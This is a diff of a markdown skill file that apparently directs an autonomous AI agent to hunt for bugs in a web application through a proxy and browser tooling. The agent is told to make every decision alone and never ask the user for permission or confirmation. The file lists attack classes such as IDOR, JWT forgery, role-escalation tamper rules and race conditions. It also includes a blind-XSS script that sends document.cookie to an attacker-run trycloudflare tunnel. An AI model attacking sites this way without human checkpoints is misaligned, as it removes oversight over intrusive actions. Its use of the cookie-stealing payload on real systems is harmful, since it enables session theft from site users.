@@ -6,66 +6,98 @@ description: Main-app focused bug hunting. Pick one feature, pivot deep. Use Cai
 # Bug Hunting
 
 ## AUTONOMOUS MODE — DO NOT ASK THE USER
-Make every decision yourself. Never ask for permission, clarification, or confirmation. If stuck, pivot to a different attack class. If nothing works for 10 attempts, log it and move on.
+Make every decision yourself. Never ask for permission, clarification, or confirmation. If nothing works for 10 attempts, log it and move on.
+
+## SPIDY SENSE — TRUST IT
+If something feels weird — unexpected redirect, weird header, strange param name, odd error message, timing anomaly, response differs slightly between users — that's your spidy sense. **Stop and dig.** Don't move on until you understand exactly why it happened. Most critical bugs start as "huh, that's weird." Only stop digging when you've exhausted every angle and confirmed it's a dead end. Document what you found and why it went nowhere.
+
+## Interesting Behaviors — Log Everything
+Not every weird thing becomes a bug, but forget it and you'll never connect the dots later. Log all interesting behaviors to `interesting.md` in the hunt directory:
+- Strange responses, unexpected status codes, header anomalies
+- Endpoints that behave differently between auth states
+- Parameters that produce different results than expected
+- Anything that triggered your spidy sense but turned out to be a dead end
+These logs are how you spot patterns across features. A weird redirect on one page + a weird param on another = chain you hadn't considered.
 
 ## Strategy: Main App Guy
-- **One target**: the main application. Not subdomains, not staging, not api. subdomain.
-- **One feature**: pick one core feature (search, profile, checkout, upload, etc.) and go deep on it
-- **Pivot hard**: every response is a lead. A 403 means test auth bypass. A verbose error means probe for injection. A user ID in a response means test IDOR.
-- **No wide hunting**: don't waste tokens enumerating URLs, subdomains, or sourcemaps. You already have the target. Hack it.
+- **One target**: the main application. Not subdomains, not staging, not api.subdomain.
+- **Feature-driven**: pick one feature, throw every bug class at it. IDOR didn't work? Try mass assignment. No? Try race condition. No? Try JWT. The feature determines the attacks, not a checklist.
+- **Pivot hard**: every response is a lead. A 403 means test auth bypass. A verbose error means probe for injection. A user ID means test IDOR. A JWT means test JWT attacks.
+- **No wide hunting**: don't waste tokens on URL enumeration or sourcemaps. You already have the target. Hack it.
+
+## Session Persistence
+- **Session directory**: `~/hunts/sessions/<domain>/` — one folder per target domain
+- **Structure**: `~/hunts/sessions/<domain>/userA.json` and `userB.json` for state. `~/hunts/sessions/<domain>/profile/` for persistent Chrome profile.
+- **Reuse existing**: if session files exist, load them with `--state <path>`. Don't re-login unless the session is expired.
+- **Create if missing**: if no session files, log in fresh via agent-browser and save state with `--state <path>`.
+- **Usage**: `agent-browser --session userA --state ~/hunts/sessions/example.com/userA.json open <target>`
+- **Two sessions**: always userA and userB. Load both on every hunt.
+- **Re-auth**: if a session expires, log back in and overwrite the state file. 80% of tokens were wasted on auth in the article — don't repeat this.
 
 ## UI Bypass via Caido Match & Replace
-Use Caido's `create_tamper_rule` / `toggle_tamper_rule` to modify traffic in transit — this lets you bypass frontend restrictions without touching the browser:
+Use `create_tamper_rule` / `toggle_tamper_rule` to flip UI-gating flags in transit:
 
-Common tamper rules to create:
-- **Premium bypass**: match `"isPremium":false` → replace `"isPremium":true`
-- **Role escalation**: match `"role":"user"` → replace `"role":"admin"`
-- **Feature flags**: match `"featureEnabled":false` → replace `"featureEnabled":true`
-- **Paywalls**: match `"subscriptionTier":"free"` → replace `"subscriptionTier":"enterprise"`
-- **Rate limits**: match `X-RateLimit-Remaining:\s*0` → replace `X-RateLimit-Remaining: 999`
-- **Disabled buttons/inputs**: match `"disabled":true` → replace `"disabled":false`
-- **Hidden fields**: match `"hidden":true` → replace `"hidden":false`
-- **Any UI gating**: look for boolean/flag responses that gate UI features and flip them
+- Premium bypass, role escalation, feature flags, paywalls, rate limits, disabled/hidden fields
+- Browse the feature in agent-browser, inspect response for boolean flags, create tamper rule, reload
+- If unlocked UI reveals new endpoints, pivot into them
 
-Steps:
-1. Browse the feature in agent-browser, capture the request in Caido
-2. Inspect the response for boolean flags, roles, tiers, feature gates
-3. Create a tamper rule in Caido to flip the flag on subsequent requests
-4. Reload the page in agent-browser to see the unlocked UI
-5. If something new appears, that's an attack surface — pivot into it
-
-## Attack Methodology (per feature)
-1. Use agent-browser to interact with the feature while Caido captures traffic
-2. Inspect Caido history for API calls the feature makes
-3. For each endpoint, test: IDOR (change IDs), auth bypass (remove/send wrong cookies), mass assignment (add extra fields), injection (mess with params)
-4. If any response shows flags, roles, limits, tiers — create tamper rules and reload
-5. If the unlocked UI reveals new endpoints, repeat from step 1 on those
+## Two Accounts — Always
+Create two accounts. Open `--session userA` and `--session userB`. Capture requests as userA, replay with userB's cookies via Caido `edit_request`. If userB sees userA's data, that's real IDOR.
 
 ## Fuzzing
-- **Payloads**: stored at `/mnt/d/Desktop/coffinxp-payloads`
-- **Path fuzzing**: use `Pentester_wordlist.pay` from that directory
-- **If site is too restrictive**: skip fuzzing entirely. Concentrate on finding vulns directly through manual testing, tamper rules, and logic analysis. No point fighting WAFs/rate limits — pivot to smarter attacks.
+- **Payloads**: `/mnt/d/Desktop/coffinxp-payloads`
+- **Path fuzzing**: `Pentester_wordlist.pay`
+- **Parameter fuzzing via Caido Automate**: set up automate sessions with `batch_send` to fuzz a single endpoint — replace values, vary types, add unexpected params. Use threads=3, request delay to avoid rate limiting.
+- **If site is too restrictive**: skip fuzzing entirely. No point fighting WAFs. Pivot to manual testing and tamper rules.
 
-## Vulnerability Classes (in priority order)
-1. **IDOR** — change numeric/UUID IDs in requests. Check responses for other users' data.
-2. **Auth bypass** — remove cookie, change cookie, use another account's cookie. Check if endpoints actually check auth.
-3. **Mass assignment** — add extra fields to JSON bodies. Try `role`, `isAdmin`, `premium`, `featureFlags`.
-4. **XSS** — inject into every reflected parameter. Check DOM sinks in JS responses.
-5. **SSRF** — any URL parameter, webhook, file fetch, image URL. Point at internal targets.
-6. **Injections** — SQLi (parameter pollution), template injection, command injection in file operations.
+## Vulnerability Classes (feature-driven, not sequential)
+For each feature, cycle through every class that applies:
+
+### IDOR
+- Change IDs in path/body/headers. Cross-check userA vs userB responses. Diff them — extra fields in one response leak data.
+
+### Auth bypass
+- Remove cookie, swap cookie between userA/userB, try expired tokens, try empty auth header. Check if endpoints actually enforce auth.
+
+### Mass assignment
+- Add extra fields to JSON bodies: `role`, `isAdmin`, `premium`, `creditBalance`, `featureFlags`. Try PATCH/PUT on profile, settings, cart.
+
+### XSS
+- Inject into every reflected parameter. Check DOM sinks in JS. Verify in headed browser — text-only misses CSP/sanitization.
+
+### SSRF
+- URL params, webhooks, file fetches, image URLs, redirect URLs. Point at internal targets.
+
+### Injections
+- SQLi (parameter pollution), SSTI, command injection in file ops/export features.
+
+### JWT attacks
+- `alg: none`, weak HMAC secret (brute common keys), `kid` injection (path traversal, SQLi in kid value), missing signature verification, expired tokens still accepted, role/scope tampering in decoded payload.
+
+### Race conditions
+- Use Caido `race_window_send` to fire multiple requests simultaneously
+- Test: coupon reuse, likes/follows inflation, balance transfer, ticket booking, vote manipulation, any decrement/increment operation
+- Send 5-10 concurrent requests, check if any succeeded twice (duplicate processing)
+
+### OOB / Blind detection via Cloudflare tunnel
+- Start a Cloudflare tunnel: `cloudflared tunnel --url http://localhost:8080` (or whatever port)
+- For blind XSS: inject `<script>fetch('https://<tunnel>.trycloudflare.com/?c='+document.cookie)</script>`
+- For blind SSRF: point webhooks/image URLs at the tunnel URL
+- Check tunnel logs for incoming requests — if one arrives, the blind vuln is confirmed
+- Alternative: use `interactsh-client` or `burp collaborator` if cloudflared isn't available
 
 ## Tools
 
 ### Sending HTTP Requests — CAIDO ONLY
-**Never use curl, python, or any tool other than Caido.**
-- `send_request` / `edit_request` / `batch_send` for all HTTP traffic
-- `list_requests` with HTTPQL to find requests in history
-- `create_tamper_rule` / `toggle_tamper_rule` for Match & Replace UI bypass
-- Everything stays in Caido history for later inspection
+- `send_request` / `edit_request` / `batch_send` / `race_window_send` for all HTTP
+- `list_requests` with HTTPQL to find requests
+- `create_tamper_rule` / `toggle_tamper_rule` for Match & Replace
+- `create_automate_session` / `get_automate_entry` for fuzzing
 
 ### Browser Testing — AGENT-BROWSER ONLY
 - Always `--headed` for XSS validation
-- Workflow: open → snapshot -i → interact via refs → re-snapshot
+- `--session <name>` for separate user sessions
+- `--session-name <name>` for persistent auth state
 
 ## Validation Requirement
 Before logging any finding as confirmed, invoke the bug-validator skill. Do not mark CONFIRMED yourself — only the validator's verdict counts.
